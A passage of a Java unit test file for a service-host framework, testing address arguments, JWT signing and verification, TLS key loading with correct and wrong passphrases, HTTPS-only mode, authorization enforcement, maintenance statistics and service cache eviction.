ServiceHost.Arguments();\n            hostArgs.bindAddress = \"\";\n            try {\n                h.initialize(hostArgs);\n                throw new IllegalStateException(\"should have failed\");\n            } catch (IllegalArgumentException e) {\n\n            }\n\n            hostArgs = new ServiceHost.Arguments();\n            hostArgs.port = -2;\n            try {\n                h.initialize(hostArgs);\n                throw new IllegalStateException(\"should have failed\");\n            } catch (IllegalArgumentException e) {\n\n            }\n\n            String bindAddress = \"127.0.0.1\";\n            String publicAddress = \"10.1.1.19\";\n            int publicPort = 1634;\n            String hostId = UUID.randomUUID().toString();\n\n            String[] args = {\n                    \"--sandbox=\" + this.tmpFolder.getRoot().getAbsolutePath(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--publicUri=\" + new URI(\"http://\" + publicAddress + \":\" + publicPort),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args);\n            h.start();\n\n            assertEquals(bindAddress, h.getPreferredAddress());\n\n            assertEquals(h.getPort(), h.getUri().getPort());\n            assertEquals(bindAddress, h.getUri().getHost());\n\n            // confirm that public URI takes precedence over bind address\n            assertEquals(publicAddress, h.getPublicUri().getHost());\n            assertEquals(publicPort, h.getPublicUri().getPort());\n\n            // confirm the node group self node entry uses the public URI for the bind address\n            NodeGroupState ngs = this.host.getServiceState(null, NodeGroupState.class,\n                    UriUtils.buildUri(h.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP));\n\n            NodeState selfEntry = ngs.nodes.get(h.getId());\n            assertEquals(publicAddress, selfEntry.groupReference.getHost());\n            assertEquals(publicPort, selfEntry.groupReference.getPort());\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void jwtSecret() throws Throwable {\n        setUp(false);\n\n        Claims claims = new Claims.Builder().setSubject(\"foo\").getResult();\n\n        Signer bogusSigner = new Signer(\"bogus\".getBytes());\n        Signer defaultSigner = this.host.getTokenSigner();\n        Verifier defaultVerifier = this.host.getTokenVerifier();\n\n        String signedByBogus = bogusSigner.sign(claims);\n        String signedByDefault = defaultSigner.sign(claims);\n\n        try {\n            defaultVerifier.verify(signedByBogus);\n            fail(\"Signed by bogusSigner should be invalid for defaultVerifier.\");\n        } catch (Verifier.InvalidSignatureException ex) {\n        }\n\n        Rfc7519Claims verified = defaultVerifier.verify(signedByDefault);\n        assertEquals(\"foo\", verified.getSubject());\n\n        this.host.stop();\n\n        // assign cert and private-key. private-key is used for JWT seed.\n        URI certFileUri = getClass().getResource(\"/ssl/server.crt\").toURI();\n        URI keyFileUri = getClass().getResource(\"/ssl/server.pem\").toURI();\n\n        this.host.setCertificateFileReference(certFileUri);\n        this.host.setPrivateKeyFileReference(keyFileUri);\n        // must assign port to zero, so we get a *new*, available port on restart.\n        this.host.setPort(0);\n        this.host.start();\n\n        Signer newSigner = this.host.getTokenSigner();\n        Verifier newVerifier = this.host.getTokenVerifier();\n\n        assertNotSame(\"new signer must be created\", defaultSigner, newSigner);\n        assertNotSame(\"new verifier must be created\", defaultVerifier, newVerifier);\n\n        try {\n            newVerifier.verify(signedByDefault);\n            fail(\"Signed by defaultSigner should be invalid for newVerifier\");\n        } catch (Verifier.InvalidSignatureException ex) {\n        }\n\n        // sign by newSigner\n        String signedByNewSigner = newSigner.sign(claims);\n\n        verified = newVerifier.verify(signedByNewSigner);\n        assertEquals(\"foo\", verified.getSubject());\n\n        try {\n            defaultVerifier.verify(signedByNewSigner);\n            fail(\"Signed by newSigner should be invalid for defaultVerifier\");\n        } catch (Verifier.InvalidSignatureException ex) {\n        }\n\n    }\n\n    @Test\n    public void startWithNonEncryptedPem() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        String tmpFolderPath = this.tmpFolder.getRoot().getAbsolutePath();\n\n        // We run test from filesystem so far, thus expect files to be on file system.\n        // For example, if we run test from jar file, needs to copy the resource to tmp dir.\n        Path certFilePath = Paths.get(getClass().getResource(\"/ssl/server.crt\").toURI());\n        Path keyFilePath = Paths.get(getClass().getResource(\"/ssl/server.pem\").toURI());\n        String certFile = certFilePath.toFile().getAbsolutePath();\n        String keyFile = keyFilePath.toFile().getAbsolutePath();\n\n        String[] args = {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n        } finally {\n            h.stop();\n        }\n\n        // with wrong password\n        args = new String[]{\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n                \"--keyPassphrase=WRONG_PASSWORD\",\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n            fail(\"Host should NOT start with password for non-encrypted pem key\");\n        } catch (Exception ex) {\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void startWithEncryptedPem() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        String tmpFolderPath = this.tmpFolder.getRoot().getAbsolutePath();\n\n        // We run test from filesystem so far, thus expect files to be on file system.\n        // For example, if we run test from jar file, needs to copy the resource to tmp dir.\n        Path certFilePath = Paths.get(getClass().getResource(\"/ssl/server.crt\").toURI());\n        Path keyFilePath = Paths.get(getClass().getResource(\"/ssl/server-with-pass.p8\").toURI());\n        String certFile = certFilePath.toFile().getAbsolutePath();\n        String keyFile = keyFilePath.toFile().getAbsolutePath();\n\n        String[] args = {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n                \"--keyPassphrase=password\",\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n        } finally {\n            h.stop();\n        }\n\n        // with wrong password\n        args = new String[]{\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n                \"--keyPassphrase=WRONG_PASSWORD\",\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n            fail(\"Host should NOT start with wrong password for encrypted pem key\");\n        } catch (Exception ex) {\n        } finally {\n            h.stop();\n        }\n\n        // with no password\n        args = new String[]{\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=0\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile,\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n            fail(\"Host should NOT start when no password is specified for encrypted pem key\");\n        } catch (Exception ex) {\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void httpsOnly() throws Throwable {\n        ExampleServiceHost h = new ExampleServiceHost();\n        String tmpFolderPath = this.tmpFolder.getRoot().getAbsolutePath();\n\n        // We run test from filesystem so far, thus expect files to be on file system.\n        // For example, if we run test from jar file, needs to copy the resource to tmp dir.\n        Path certFilePath = Paths.get(getClass().getResource(\"/ssl/server.crt\").toURI());\n        Path keyFilePath = Paths.get(getClass().getResource(\"/ssl/server.pem\").toURI());\n        String certFile = certFilePath.toFile().getAbsolutePath();\n        String keyFile = keyFilePath.toFile().getAbsolutePath();\n\n        // set -1 to disable http\n        String[] args = {\n                \"--sandbox=\" + tmpFolderPath,\n                \"--port=-1\",\n                \"--securePort=0\",\n                \"--certificateFile=\" + certFile,\n                \"--keyFile=\" + keyFile\n        };\n\n        try {\n            h.initialize(args);\n            h.start();\n\n            assertNull(\"http should be disabled\", h.getListener());\n            assertNotNull(\"https should be enabled\", h.getSecureListener());\n        } finally {\n            h.stop();\n        }\n    }\n\n\n    @Test\n    public void setAuthEnforcement() throws Throwable {\n        setUp(false);\n        ExampleServiceHost h = new ExampleServiceHost();\n        try {\n            String bindAddress = \"127.0.0.1\";\n            String hostId = UUID.randomUUID().toString();\n\n            String[] args = {\n                    \"--sandbox=\" + this.tmpFolder.getRoot().getAbsolutePath(),\n                    \"--port=0\",\n                    \"--bindAddress=\" + bindAddress,\n                    \"--isAuthorizationEnabled=\" + Boolean.TRUE.toString(),\n                    \"--id=\" + hostId\n            };\n\n            h.initialize(args);\n            assertTrue(h.isAuthorizationEnabled());\n            h.setAuthorizationEnabled(false);\n            assertFalse(h.isAuthorizationEnabled());\n            h.setAuthorizationEnabled(true);\n            h.start();\n\n            this.host.testStart(1);\n            h.sendRequest(Operation\n                    .createGet(UriUtils.buildUri(h.getUri(), ServiceUriPaths.DEFAULT_NODE_GROUP))\n                    .setReferer(this.host.getReferer())\n                    .setCompletion((o, e) -> {\n                        if (o.getStatusCode() == Operation.STATUS_CODE_FORBIDDEN) {\n                            this.host.completeIteration();\n                            return;\n                        }\n                        this.host.failIteration(new IllegalStateException(\n                                \"Op succeded when failure expected\"));\n                    }));\n            this.host.testWait();\n        } finally {\n            h.stop();\n        }\n\n    }\n\n    @Test\n    public void serviceStartExpiration() throws Throwable {\n        setUp(false);\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS.toMicros(100);\n        // set a small period so its pretty much guaranteed to execute\n        // maintenance during this test\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n\n        // start a service but tell it to not complete the start POST. This will induce a timeout\n        // failure from the host\n\n        MinimalTestServiceState initialState = new MinimalTestServiceState();\n        initialState.id = MinimalTestService.STRING_MARKER_TIMEOUT_REQUEST;\n        this.host.testStart(1);\n        Operation startPost = Operation\n                .createPost(UriUtils.buildUri(this.host, UUID.randomUUID().toString()))\n                .setExpiration(Utils.fromNowMicrosUtc(maintenanceIntervalMicros))\n                .setBody(initialState)\n                .setCompletion(this.host.getExpectedFailureCompletion());\n        this.host.startService(startPost, new MinimalTestService());\n        this.host.testWait();\n    }\n\n    @Test\n    public void startServiceSelfLinkWithStar() throws Throwable {\n        setUp(false);\n        MinimalTestServiceState initialState = new MinimalTestServiceState();\n        initialState.id = this.host.nextUUID();\n        TestContext ctx = this.host.testCreate(1);\n        Operation startPost = Operation\n                .createPost(UriUtils.buildUri(this.host, this.host.nextUUID() + \"*\"))\n                .setBody(initialState).setCompletion(ctx.getExpectedFailureCompletion());\n        this.host.startService(startPost, new MinimalTestService());\n        this.host.testWait(ctx);\n    }\n\n    public static class StopOrderTestService extends StatefulService {\n\n        public int stopOrder;\n\n        public AtomicInteger globalStopOrder;\n\n        public StopOrderTestService() {\n            super(MinimalTestServiceState.class);\n        }\n\n        @Override\n        public void handleStop(Operation delete) {\n            this.stopOrder = this.globalStopOrder.incrementAndGet();\n            delete.complete();\n        }\n\n    }\n\n    public static class PrivilegedStopOrderTestService extends StatefulService {\n\n        public int stopOrder;\n\n        public AtomicInteger globalStopOrder;\n\n        public PrivilegedStopOrderTestService() {\n            super(MinimalTestServiceState.class);\n        }\n\n        @Override\n        public void handleStop(Operation delete) {\n            this.stopOrder = this.globalStopOrder.incrementAndGet();\n            delete.complete();\n        }\n\n    }\n\n    @Test\n    public void serviceStopOrder() throws Throwable {\n        setUp(false);\n\n        // start a service but tell it to not complete the start POST. This will induce a timeout\n        // failure from the host\n\n        int serviceCount = 10;\n        AtomicInteger order = new AtomicInteger(0);\n        this.host.testStart(serviceCount);\n        List<StopOrderTestService> normalServices = new ArrayList<>();\n        for (int i = 0; i < serviceCount; i++) {\n            MinimalTestServiceState initialState = new MinimalTestServiceState();\n            initialState.id = UUID.randomUUID().toString();\n            StopOrderTestService normalService = new StopOrderTestService();\n            normalServices.add(normalService);\n            normalService.globalStopOrder = order;\n            Operation post = Operation.createPost(UriUtils.buildUri(this.host, initialState.id))\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.startService(post, normalService);\n        }\n        this.host.testWait();\n\n\n        this.host.addPrivilegedService(PrivilegedStopOrderTestService.class);\n        List<PrivilegedStopOrderTestService> pServices = new ArrayList<>();\n        this.host.testStart(serviceCount);\n        for (int i = 0; i < serviceCount; i++) {\n            MinimalTestServiceState initialState = new MinimalTestServiceState();\n            initialState.id = UUID.randomUUID().toString();\n            PrivilegedStopOrderTestService ps = new PrivilegedStopOrderTestService();\n            pServices.add(ps);\n            ps.globalStopOrder = order;\n            Operation post = Operation.createPost(UriUtils.buildUri(this.host, initialState.id))\n                    .setBody(initialState)\n                    .setCompletion(this.host.getCompletion());\n            this.host.startService(post, ps);\n        }\n        this.host.testWait();\n\n        this.host.stop();\n\n        for (PrivilegedStopOrderTestService pService : pServices) {\n            for (StopOrderTestService normalService : normalServices) {\n                this.host.log(\"normal order: %d, privileged: %d\", normalService.stopOrder,\n                        pService.stopOrder);\n                assertTrue(normalService.stopOrder < pService.stopOrder);\n            }\n        }\n    }\n\n    @Test\n    public void maintenanceAndStatsReporting() throws Throwable {\n        CommandLineArgumentParser.parseFromProperties(this);\n        for (int i = 0; i < this.iterationCount; i++) {\n            this.tearDown();\n            doMaintenanceAndStatsReporting();\n        }\n    }\n\n    private void doMaintenanceAndStatsReporting() throws Throwable {\n        setUp(true);\n\n        long maintIntervalMillis = 100;\n        long maintenanceIntervalMicros = TimeUnit.MILLISECONDS.toMicros(maintIntervalMillis);\n        this.host.setMaintenanceIntervalMicros(maintenanceIntervalMicros);\n        this.host.setServiceCacheClearDelayMicros(TimeUnit.MILLISECONDS\n                .toMicros(maintIntervalMillis * 5));\n        this.host.start();\n\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE,\n                ServiceOption.INSTRUMENTATION, ServiceOption.PERIODIC_MAINTENANCE);\n\n        List<Service> services = this.host.doThroughputServiceStart(\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null);\n\n        long start = System.nanoTime() / 1000;\n        long slowMaintInterval = this.host.getMaintenanceIntervalMicros() * 10;\n        List<Service> slowMaintServices = this.host.doThroughputServiceStart(null,\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null, slowMaintInterval);\n\n        double maintCount = getHostMaintenanceCount();\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > maintCount + 10;\n        });\n\n        long end = System.nanoTime() / 1000;\n        double expectedMaintIntervals = Math.max(1, (end - start) / slowMaintInterval);\n\n        // verify that services with slow maintenance did not get more than one maint cycle\n        URI[] statUris = buildStatsUris(this.serviceCount, slowMaintServices);\n        Map<URI, ServiceStats> stats = this.host.getServiceState(null,\n                ServiceStats.class, statUris);\n\n        for (ServiceStats s : stats.values()) {\n\n            for (ServiceStat st : s.entries.values()) {\n                if (st.name.equals(Service.STAT_NAME_MAINTENANCE_COUNT)) {\n                    // give a slop of 3 extra intervals:\n                    // 1 due to rounding, 2 due to interval running before we do setMaintenance\n                    // to a slower interval ( notice we start services, then set the interval)\n                    if (st.latestValue > expectedMaintIntervals + 3) {\n                        throw new IllegalStateException(\n                                \"too many maintenance runs for slow maint. service:\"\n                                        + st.latestValue);\n                    }\n                }\n            }\n        }\n\n        this.host.testStart(services.size());\n        // delete all minimal service instances\n        for (Service s : services) {\n            this.host.send(Operation.createDelete(s.getUri()).setBody(new ServiceDocument())\n                    .setCompletion(this.host.getCompletion()));\n        }\n        this.host.testWait();\n\n        this.host.testStart(slowMaintServices.size());\n        // delete all slow minimal service instances\n        for (Service s : slowMaintServices) {\n            this.host.send(Operation.createDelete(s.getUri()).setBody(new ServiceDocument())\n                    .setCompletion(this.host.getCompletion()));\n        }\n        this.host.testWait();\n\n        // before we increase maintenance interval, verify stats reported by MGMT service\n        verifyMgmtServiceStats();\n\n        // now validate that service handleMaintenance does not get called right after start, but at least\n        // one interval later. We set the interval to 30 seconds so we can verify it did not get called within\n        // one second or so\n        long maintMicros = TimeUnit.SECONDS.toMicros(30);\n        this.host.setMaintenanceIntervalMicros(maintMicros);\n\n        // there is a small race: if the host scheduled a maintenance task already, using the default\n        // 1 second interval, its possible it executes maintenance on the newly added services using\n        // the 1 second schedule, instead of 30 seconds. So wait at least one maint. interval with the\n        // default interval\n        Thread.sleep(1000);\n\n        slowMaintServices = this.host.doThroughputServiceStart(\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null);\n\n        // sleep again and check no maintenance run right after start\n        Thread.sleep(250);\n\n        statUris = buildStatsUris(this.serviceCount, slowMaintServices);\n        stats = this.host.getServiceState(null,\n                ServiceStats.class, statUris);\n\n        for (ServiceStats s : stats.values()) {\n            for (ServiceStat st : s.entries.values()) {\n                if (st.name.equals(Service.STAT_NAME_MAINTENANCE_COUNT)) {\n                    throw new IllegalStateException(\"Maintenance run before first expiration:\"\n                            + Utils.toJsonHtml(s));\n                }\n            }\n        }\n\n        // some services are at 100ms maintenance and the host is at 30 seconds, verify the\n        // check maintenance interval is the minimum of the two\n        long currentMaintInterval = this.host.getMaintenanceIntervalMicros();\n        long currentCheckInterval = this.host.getMaintenanceCheckIntervalMicros();\n        assertTrue(currentMaintInterval > currentCheckInterval);\n\n        // create new set of services\n        services = this.host.doThroughputServiceStart(\n                this.serviceCount, MinimalTestService.class, this.host.buildMinimalTestState(),\n                caps,\n                null);\n\n        // set the  interval for a service to something smaller than the host interval, then confirm\n        // that only the maintenance *check* interval changed, not the host global maintenance interval, which\n        // can affect all services\n        for (Service s : services) {\n            s.setMaintenanceIntervalMicros(currentCheckInterval / 2);\n            break;\n        }\n\n        this.host.waitFor(\"check interval not updated\", () -> {\n            // verify the check interval is now lower\n            if (currentCheckInterval / 2 != this.host.getMaintenanceCheckIntervalMicros()) {\n                return false;\n            }\n            if (currentMaintInterval != this.host.getMaintenanceIntervalMicros()) {\n                return false;\n            }\n            return true;\n        });\n    }\n\n    private void verifyMgmtServiceStats() {\n        URI serviceHostMgmtURI = UriUtils.buildUri(this.host, ServiceUriPaths.CORE_MANAGEMENT);\n        this.host.waitFor(\"wait for http stat update.\", () -> {\n            Operation get = Operation.createGet(this.host, ServiceHostManagementService.SELF_LINK);\n            this.host.send(get.forceRemote());\n            this.host.send(get.clone().forceRemote().setConnectionSharing(true));\n\n            Map<String, ServiceStat> hostMgmtStats = this.host\n                    .getServiceStats(serviceHostMgmtURI);\n            ServiceStat http1ConnectionCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_CONNECTION_COUNT_PER_DAY);\n            if (http1ConnectionCountDaily == null\n                    || http1ConnectionCountDaily.version < 3) {\n                return false;\n            }\n            ServiceStat http2ConnectionCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_CONNECTION_COUNT_PER_DAY);\n            if (http2ConnectionCountDaily == null\n                    || http2ConnectionCountDaily.version < 3) {\n                return false;\n            }\n            return true;\n        });\n\n\n        this.host.waitFor(\"stats never populated\", () -> {\n            // confirm host global time series stats have been created / updated\n            Map<String, ServiceStat> hostMgmtStats = this.host.getServiceStats(serviceHostMgmtURI);\n\n            ServiceStat serviceCount = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_SERVICE_COUNT);\n            if (serviceCount == null || serviceCount.latestValue < 2) {\n                this.host.log(\"not ready: %s\", Utils.toJson(serviceCount));\n                return false;\n            }\n\n            ServiceStat freeMemDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_MEMORY_BYTES_PER_DAY);\n            if (!isTimeSeriesStatReady(freeMemDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeMemDaily));\n                return false;\n            }\n            ServiceStat freeMemHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_MEMORY_BYTES_PER_HOUR);\n            if (!isTimeSeriesStatReady(freeMemHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeMemHourly));\n                return false;\n            }\n            ServiceStat freeDiskDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_DISK_BYTES_PER_DAY);\n            if (!isTimeSeriesStatReady(freeDiskDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeDiskDaily));\n                return false;\n            }\n            ServiceStat freeDiskHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_AVAILABLE_DISK_BYTES_PER_HOUR);\n            if (!isTimeSeriesStatReady(freeDiskHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(freeDiskHourly));\n                return false;\n            }\n            ServiceStat cpuUsageDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_CPU_USAGE_PCT_PER_DAY);\n            if (!isTimeSeriesStatReady(cpuUsageDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(cpuUsageDaily));\n                return false;\n            }\n            ServiceStat cpuUsageHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_CPU_USAGE_PCT_PER_HOUR);\n            if (!isTimeSeriesStatReady(cpuUsageHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(cpuUsageHourly));\n                return false;\n            }\n            ServiceStat threadCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_JVM_THREAD_COUNT_PER_DAY);\n            if (!isTimeSeriesStatReady(threadCountDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(threadCountDaily));\n                return false;\n            }\n            ServiceStat threadCountHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_JVM_THREAD_COUNT_PER_HOUR);\n            if (!isTimeSeriesStatReady(threadCountHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(threadCountHourly));\n                return false;\n            }\n\n            ServiceStat http1PendingCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_PENDING_OP_COUNT_PER_DAY);\n            if (!isTimeSeriesStatReady(http1PendingCountDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http1PendingCountDaily));\n                return false;\n            }\n            ServiceStat http1PendingCountHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_PENDING_OP_COUNT_PER_HOUR);\n            if (!isTimeSeriesStatReady(http1PendingCountHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http1PendingCountHourly));\n                return false;\n            }\n            ServiceStat http2PendingCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_PENDING_OP_COUNT_PER_DAY);\n            if (!isTimeSeriesStatReady(http2PendingCountDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http2PendingCountDaily));\n                return false;\n            }\n            ServiceStat http2PendingCountHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_PENDING_OP_COUNT_PER_HOUR);\n            if (!isTimeSeriesStatReady(http2PendingCountHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http2PendingCountHourly));\n                return false;\n            }\n\n            ServiceStat http1AvailableConnectionCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_AVAILABLE_CONNECTION_COUNT_PER_DAY);\n            if (!isTimeSeriesStatReady(http1AvailableConnectionCountDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http1AvailableConnectionCountDaily));\n                return false;\n            }\n            ServiceStat http1AvailableConnectionCountHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP11_AVAILABLE_CONNECTION_COUNT_PER_HOUR);\n            if (!isTimeSeriesStatReady(http1AvailableConnectionCountHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http1AvailableConnectionCountHourly));\n                return false;\n            }\n            ServiceStat http2AvailableConnectionCountDaily = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_AVAILABLE_CONNECTION_COUNT_PER_DAY);\n            if (!isTimeSeriesStatReady(http2AvailableConnectionCountDaily)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http2AvailableConnectionCountDaily));\n                return false;\n            }\n            ServiceStat http2AvailableConnectionCountHourly = hostMgmtStats\n                    .get(ServiceHostManagementService.STAT_NAME_HTTP2_AVAILABLE_CONNECTION_COUNT_PER_HOUR);\n            if (!isTimeSeriesStatReady(http2AvailableConnectionCountHourly)) {\n                this.host.log(\"not ready: %s\", Utils.toJson(http2AvailableConnectionCountHourly));\n                return false;\n            }\n\n            TestUtilityService.validateTimeSeriesStat(freeMemDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(freeMemHourly, TimeUnit.MINUTES.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(freeDiskDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(freeDiskHourly, TimeUnit.MINUTES.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(cpuUsageDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(cpuUsageHourly, TimeUnit.MINUTES.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(threadCountDaily, TimeUnit.HOURS.toMillis(1));\n            TestUtilityService.validateTimeSeriesStat(threadCountHourly,\n                    TimeUnit.MINUTES.toMillis(1));\n            return true;\n        });\n    }\n\n    private boolean isTimeSeriesStatReady(ServiceStat st) {\n        return st != null && st.timeSeriesStats != null;\n    }\n\n    @Test\n    public void testCacheClearAndRefresh() throws Throwable {\n        setUp(false);\n        this.host.setServiceCacheClearDelayMicros(TimeUnit.MILLISECONDS.toMicros(100));\n\n        // no INSTRUMENTATION, as it prevents cache eviction\n        EnumSet<ServiceOption> caps = EnumSet.of(ServiceOption.PERSISTENCE, ServiceOption.FACTORY_ITEM);\n\n        // Start the factory service. it will be needed to start services on-demand\n        MinimalFactoryTestService factoryService = new MinimalFactoryTestService();\n        factoryService.setChildServiceCaps(caps);\n        this.host.startServiceAndWait(factoryService, \"service\", null);\n\n        // Start some test services\n        List<Service> services = this.host.doThroughputServiceStart(this.serviceCount,\n                MinimalTestService.class, this.host.buildMinimalTestState(), caps, null);\n\n        // wait for some host maintenance intervals\n        double maintCount = getHostMaintenanceCount();\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > maintCount + 1;\n        });\n\n        // verify services have stopped\n        this.host.waitFor(\"wait for services to stop.\", () -> {\n            for (Service service : services) {\n                if (this.host.getServiceStage(service.getSelfLink()) != null) {\n                    return false;\n                }\n            }\n\n            return true;\n        });\n\n        // reset cache clear delay to default value\n        this.host.setServiceCacheClearDelayMicros(\n                ServiceHostState.DEFAULT_SERVICE_CACHE_CLEAR_DELAY_MICROS);\n\n        // Perform a GET on each service to repopulate the service state cache\n        TestContext ctx = this.host.testCreate(services.size());\n        for (Service service : services) {\n            Operation get = Operation.createGet(service.getUri()).setCompletion(ctx.getCompletion());\n            this.host.send(get);\n        }\n        this.host.testWait(ctx);\n\n        // Now do many more overlapping gets -- since the operations above have returned, these\n        // should all hit the cache.\n        int requestCount = 10;\n        ctx = this.host.testCreate(requestCount * services.size());\n        for (Service service : services) {\n            for (int i = 0; i < requestCount; i++) {\n                Operation get = Operation.createGet(service.getUri()).setCompletion(ctx.getCompletion());\n                this.host.send(get);\n            }\n        }\n        this.host.testWait(ctx);\n\n        Map<String, ServiceStat> mgmtStats = this.host.getServiceStats(this.host.getManagementServiceUri());\n\n        // verify cache miss count\n        ServiceStat cacheMissStat = mgmtStats.get(ServiceHostManagementService.STAT_NAME_SERVICE_CACHE_MISS_COUNT);\n        assertNotNull(cacheMissStat);\n        assertTrue(cacheMissStat.latestValue >= this.serviceCount);\n\n        // verify cache hit count\n        ServiceStat cacheHitStat = mgmtStats.get(ServiceHostManagementService.STAT_NAME_SERVICE_CACHE_HIT_COUNT);\n        assertNotNull(cacheHitStat);\n        assertTrue(cacheHitStat.latestValue >= requestCount * this.serviceCount);\n\n        // now set host cache clear delay to a short value but the services' cached clear\n        // delay to a long value, and verify that the services are stopped only after\n        // the long value\n        List<Service> cachedServices = this.host.doThroughputServiceStart(this.serviceCount,\n                MinimalTestService.class, this.host.buildMinimalTestState(), caps, null);\n        for (Service service : cachedServices) {\n            service.setCacheClearDelayMicros(TimeUnit.SECONDS.toMicros(5));\n        }\n        this.host.setServiceCacheClearDelayMicros(TimeUnit.MILLISECONDS.toMicros(100));\n\n        double newMaintCount = getHostMaintenanceCount();\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > newMaintCount + 1;\n        });\n\n        for (Service service : cachedServices) {\n            assertEquals(ProcessingStage.AVAILABLE,\n                    this.host.getServiceStage(service.getSelfLink()));\n        }\n\n        this.host.waitFor(\"wait for main.\", () -> {\n            double latestCount = getHostMaintenanceCount();\n            return latestCount > newMaintCount + 5;\n        });\n\n        for (Service service : cachedServices) {\n            ProcessingStage processingStage = this.host.getServiceStage(service.getSelfLink());\n            assertTrue(processingStage == null || processingStage == ProcessingStage.STOPPED);\n        }\n\n    }\n\n    @Test\n    public void registerForServiceAvailabilityTimeout()\n            throws Throwable {\n        setUp(false);\n        int c = 10;\n        this.host.testStart(c);\n        // issue requests to service paths we know do not exist, but induce the automatic\n        // queuing behavior for service availability, by setting targetReplicated = true\n        for (int i = 0; i < c; i++) {\n            this.host.send(Operation\n                    .createGet(UriUtils.buildUri(this.host, UUID.randomUUID().toString()))\n                    .setExpiration(Utils.fromNowMicrosUtc(TimeUnit.SECONDS.toMicros(1)))\n                    .setCompletion(this.host.getExpectedFailureCompletion()));\n        }\n        this.host.testWait();\n    }\n\n    @Test\n    public void registerForFactoryServiceAvailability()\n            throws Throwable {\n        setUp(false);\n        this.host.startFactoryServicesSynchronously(new TestFactoryService.SomeFactoryService(),\n                SomeExampleService.createFactory());\n        this.host.waitForServiceAvailable(SomeExampleService.FACTORY_LINK);\n        